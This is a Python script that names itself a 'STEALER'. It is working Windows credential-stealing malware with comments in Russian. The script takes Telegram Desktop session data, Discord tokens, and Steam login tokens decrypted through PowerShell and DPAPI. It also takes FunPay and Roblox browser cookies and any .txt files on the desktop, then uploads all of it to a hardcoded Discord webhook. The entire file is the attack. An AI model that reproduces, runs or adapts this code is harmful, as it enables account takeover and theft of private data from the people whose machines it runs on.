#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import re
import subprocess
import tempfile
import uuid
import requests
import shutil
import zipfile
from datetime import datetime

WEBHOOK_URL = "https://discord.com/api/webhooks/1505967027255382096/wPfVSqcyEpDChEDya1oB01BDzXVRzp2isCXSXWU5PDfaQvV5zX_3h_PjYRf_cVzns3Ea"

RUN_ID = str(uuid.uuid4())[:8]
TIMESTAMP = datetime.now().strftime("%Y%m%d_%H%M%S")
РАБОЧАЯ_ПАПКА = tempfile.mkdtemp()
ПАПКА_ЛОГОВ = os.path.join(РАБОЧАЯ_ПАПКА, "logs")
os.makedirs(ПАПКА_ЛОГОВ, exist_ok=True)


def send_file(filepath, filename=None):
    if os.path.exists(filepath) and os.path.getsize(filepath) > 0:
        with open(filepath, 'rb') as f:
            requests.post(WEBHOOK_URL, files={'file': (filename or os.path.basename(filepath), f)}, timeout=30)
        return True
    return False


def send_text(text, filename):
    if text:
        tmp = os.path.join(РАБОЧАЯ_ПАПКА, filename)
        with open(tmp, 'w', encoding='utf-8') as f:
            f.write(text)
        send_file(tmp, filename)


# ========== СЖАТИЕ TDATA С РАЗБИЕНИЕМ ==========
def pack_tdata_with_split(tdata_path, max_size_mb=9.9):
    """Упаковывает tdata в zip, разбивая на части если нужно"""
    
    # Разрешенные файлы/папки
    allowed = {
        "key_datas", "D877F783D5D3EF8Cs", "BB8CF9BBC15EEF14s",
        "A7FDF864FBC10B77s", "01885724E31890B8s", "35E81561EF31ECA7s",
        "19AB4AE6016C8D21s", "06C8AD3F32F87D9Bs", "04B6B3E11B4DFC66s",
        "D877F783D5D3EF8C", "A7FDF864FBC10B77"
    }
    
    # Сначала фильтруем нужные файлы во временную папку
    filtered_dir = os.path.join(РАБОЧАЯ_ПАПКА, "tdata_filtered")
    os.makedirs(filtered_dir, exist_ok=True)
    
    for name in allowed:
        src = os.path.join(tdata_path, name)
        if os.path.exists(src):
            dst = os.path.join(filtered_dir, name)
            if os.path.isdir(src):
                shutil.copytree(src, dst)
            else:
                shutil.copy2(src, dst)
    
    # Проверяем размер отфильтрованной папки
    total_size = 0
    for root, _, files in os.walk(filtered_dir):
        for f in files:
            total_size += os.path.getsize(os.path.join(root, f))
    
    total_mb = total_size / (1024 * 1024)
    print(f"  → Размер tdata после фильтрации: {total_mb:.2f} МБ")
    
    if total_mb <= max_size_mb:
        # Обычный zip
        zip_path = os.path.join(РАБОЧАЯ_ПАПКА, "tdata.zip")
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as z:
            for root, _, files in os.walk(filtered_dir):
                for f in files:
                    full = os.path.join(root, f)
                    z.write(full, os.path.relpath(full, os.path.dirname(filtered_dir)))
        send_file(zip_path, f"tdata_{RUN_ID}.zip")
        os.remove(zip_path)
        print(f"  → Tdata отправлена (1 файл)")
    else:
        # Разбиваем на части
        print(f"  → Tdata слишком большая, разбиваем на части...")
        
        # Сначала создаем полный zip
        full_zip = os.path.join(РАБОЧАЯ_ПАПКА, "tdata_full.zip")
        with zipfile.ZipFile(full_zip, 'w', zipfile.ZIP_DEFLATED) as z:
            for root, _, files in os.walk(filtered_dir):
                for f in files:
                    full = os.path.join(root, f)
                    z.write(full, os.path.relpath(full, os.path.dirname(filtered_dir)))
        
        # Разбиваем на части по max_size_mb
        part_num = 1
        with open(full_zip, 'rb') as f:
            data = f.read()
        
        chunk_size = int(max_size_mb * 1024 * 1024)
        for i in range(0, len(data), chunk_size):
            chunk = data[i:i + chunk_size]
            part_path = os.path.join(РАБОЧАЯ_ПАПКА, f"tdata_part_{part_num}.zip")
            with open(part_path, 'wb') as pf:
                pf.write(chunk)
            send_file(part_path, f"tdata_{RUN_ID}_part{part_num}.zip")
            os.remove(part_path)
            part_num += 1
        
        os.remove(full_zip)
        print(f"  → Tdata отправлена ({part_num - 1} частей)")
    
    # Очистка
    shutil.rmtree(filtered_dir, ignore_errors=True)


def steal_tdata():
    print("[1/5] Telegram tdata...")
    paths = [
        os.path.expandvars(r"%APPDATA%\Telegram Desktop\tdata"),
        os.path.expandvars(r"%APPDATA%\Telegram\tdata"),
    ]
    for p in paths:
        if os.path.exists(p):
            pack_tdata_with_split(p)
            return
    print("  ✗ Tdata не найдена")


# ========== DISCORD TOKENS ==========
def steal_discord_tokens():
    print("[2/5] Discord токены...")
    tokens = set()
    paths = [
        os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Local Storage\leveldb"),
        os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Local Storage\leveldb"),
    ]
    for path in paths:
        if os.path.exists(path):
            try:
                for f in os.listdir(path):
                    if f.endswith('.log'):
                        with open(os.path.join(path, f), 'r', errors='ignore') as file:
                            content = file.read()
                            found = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', content)
                            found += re.findall(r'mfa\.[\w-]{84}', content)
                            tokens.update(found)
            except:
                pass
    if tokens:
        send_text('\n'.join(tokens), f'discord_{RUN_ID}.txt')
        print(f"  ✓ Токенов: {len(tokens)}")
    else:
        print("  ✗ Токены не найдены")


# ========== STEAM TOKENS ==========
def run_ps(script):
    try:
        res = subprocess.run(['powershell', '-Command', script], capture_output=True, text=True, timeout=10)
        return res.stdout.strip()
    except:
        return None


def get_steam_accounts():
    accounts = {}
    paths = [
        os.path.expandvars(r"%APPDATA%\Steam\config\loginusers.vdf"),
        r"C:\Program Files (x86)\Steam\config\loginusers.vdf",
    ]
    for p in paths:
        if os.path.exists(p):
            with open(p, 'r', errors='ignore') as f:
                content = f.read()
            for m in re.finditer(r'"(\d+)"\s*\{[^}]*"AccountName"\s*"([^"]+)"', content, re.DOTALL):
                if m.group(1) != "0" and m.group(2):
                    accounts[m.group(1)] = m.group(2)
            if accounts:
                break
    return accounts


def get_connect_cache():
    cache = {}
    local_vdf = os.path.expandvars(r"%LOCALAPPDATA%\Steam\local.vdf")
    if os.path.exists(local_vdf):
        with open(local_vdf, 'r', errors='ignore') as f:
            content = f.read()
        m = re.search(r'"ConnectCache"\s*\{([^}]+)\}', content, re.DOTALL)
        if m:
            for kv in re.finditer(r'"([a-f0-9]+)"\s*"([a-f0-9]+)"', m.group(1)):
                cache[kv.group(1)] = kv.group(2)
    return cache


def crc32(data):
    import zlib
    return zlib.crc32(data) & 0xFFFFFFFF


def steal_steam():
    print("[3/5] Steam токены...")
    accounts = get_steam_accounts()
    if not accounts:
        print("  ✗ Steam не найден")
        return
    cache = get_connect_cache()
    results = []
    for sid, name in accounts.items():
        key = f"{crc32(name.encode()):x}1"
        if key in cache:
            hex_token = cache[key]
            ps = f'''
Add-Type -AssemblyName System.Security
$h = "{hex_token}"
$b = [byte[]]::new($h.Length/2)
for($i=0;$i -lt $h.Length;$i+=2){{$b[$i/2]=[Convert]::ToByte($h.Substring($i,2),16)}}
$e = [Text.Encoding]::UTF8.GetBytes("{name}")
$d = [System.Security.Cryptography.ProtectedData]::Unprotect($b, $e, 'CurrentUser')
[Text.Encoding]::UTF8.GetString($d)
'''
            token = run_ps(ps)
            if token and len(token) > 20:
                results.append(f"SteamID: {sid}\nLogin: {name}\nToken: {name}.{token}")
    if results:
        send_text('\n\n'.join(results), f'steam_{RUN_ID}.txt')
        print(f"  ✓ Steam: {len(results)}")
    else:
        print("  ✗ Steam токены не найдены")


# ========== FUNPAY ==========
def steal_funpay():
    print("[4/5] FunPay куки...")
    cookies = []
    cookie_paths = [
        os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies"),
        os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Cookies"),
    ]
    for cookie_path in cookie_paths:
        if os.path.exists(cookie_path):
            temp_db = tempfile.mktemp(suffix='.db')
            try:
                shutil.copy2(cookie_path, temp_db)
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT name, value FROM cookies WHERE host_key LIKE '%funpay%'")
                for row in cursor.fetchall():
                    cookies.append(f"{row[0]}: {row[1]}")
                conn.close()
                os.remove(temp_db)
            except:
                pass
    if cookies:
        send_text('\n'.join(set(cookies)), f'funpay_{RUN_ID}.txt')
        print(f"  ✓ FunPay: {len(set(cookies))}")
    else:
        print("  ✗ FunPay не найдены")


# ========== ROBLOX ==========
def steal_roblox():
    print("[5/5] Roblox куки...")
    cookies = []
    cookie_paths = [
        os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies"),
        os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Cookies"),
    ]
    for cookie_path in cookie_paths:
        if os.path.exists(cookie_path):
            temp_db = tempfile.mktemp(suffix='.db')
            try:
                shutil.copy2(cookie_path, temp_db)
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT value FROM cookies WHERE name='.ROBLOSECURITY'")
                for row in cursor.fetchall():
                    cookies.append(row[0])
                conn.close()
                os.remove(temp_db)
            except:
                pass
    if cookies:
        send_text('\n'.join(set(cookies)), f'roblox_{RUN_ID}.txt')
        print(f"  ✓ Roblox: {len(set(cookies))}")
    else:
        print("  ✗ Roblox не найдены")


def скопировать_txt_с_рабочего_стола():
    desktop = os.path.expanduser("~/Desktop")
    if not os.path.exists(desktop):
        desktop = os.path.expanduser("~/Рабочий стол")
    целевая = os.path.join(РАБОЧАЯ_ПАПКА, "desktop_txt")
    os.makedirs(целевая, exist_ok=True)
    if os.path.exists(desktop):
        for f in os.listdir(desktop):
            if f.endswith('.txt') and os.path.isfile(os.path.join(desktop, f)):
                shutil.copy2(os.path.join(desktop, f), целевая)
        print("  → .txt с рабочего стола скопированы")


def отправить_архив():
    print("\n[6/6] Отправка...")
    имя_архива = f"steal_{RUN_ID}_{TIMESTAMP}.zip"
    путь_архива = os.path.join(tempfile.gettempdir(), имя_архива)
    try:
        with zipfile.ZipFile(путь_архива, 'w', zipfile.ZIP_DEFLATED) as z:
            for корень, _, файлы in os.walk(ПАПКА_ЛОГОВ):
                for файл in файлы:
                    z.write(os.path.join(корень, файл), os.path.join("logs", файл))
            desktop_путь = os.path.join(РАБОЧАЯ_ПАПКА, "desktop_txt")
            if os.path.exists(desktop_путь):
                for корень, _, файлы in os.walk(desktop_путь):
                    for файл in файлы:
                        z.write(os.path.join(корень, файл), os.path.relpath(os.path.join(корень, файл), РАБОЧАЯ_ПАПКА))
        send_file(путь_архива, имя_архива)
        os.remove(путь_архива)
        print(f"  → Отправлено: {имя_архива}")
    except Exception as e:
        print(f"  → Ошибка: {e}")


def главная():
    print("=" * 60)
    print("STEALER - Tdata сжатие до 9.9 МБ + разбиение")
    print("=" * 60)
    print(f"Run ID: {RUN_ID}")
    print("=" * 60)
    
    steal_tdata()
    steal_discord_tokens()
    steal_steam()
    steal_funpay()
    steal_roblox()
    скопировать_txt_с_рабочего_стола()
    отправить_архив()
    
    shutil.rmtree(РАБОЧАЯ_ПАПКА, ignore_errors=True)
    print("\n✅ ГОТОВО!")
    input("Нажмите Enter...")


if __name__ == "__main__":
    главная()
